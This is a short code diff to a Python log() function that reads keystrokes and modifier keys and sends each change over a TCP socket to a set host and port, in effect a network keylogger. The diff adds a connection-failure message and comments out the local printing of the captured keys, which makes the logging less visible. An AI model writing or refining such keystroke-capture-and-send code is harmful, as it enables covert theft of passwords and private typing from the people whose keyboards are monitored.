@@ -191,18 +191,20 @@ def log(sleep_interval=.001):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
         while socketCon==False:
-            print('attempting to connect')
+            print('Attempting to connect')
             
             e=s.connect_ex((host,port))
             
             if e==0:
                 socketCon=True
                 print('Connected')
+            else:
+                print('Couldnt connect')
         
         changed, modifiers, keys = fetch_keys()
         if changed:
             mess2send='key,%r %r'%(keys,modifiers)
-            print(mess2send)
+#             print(mess2send)
             s.send(mess2send)
     s.close()
 
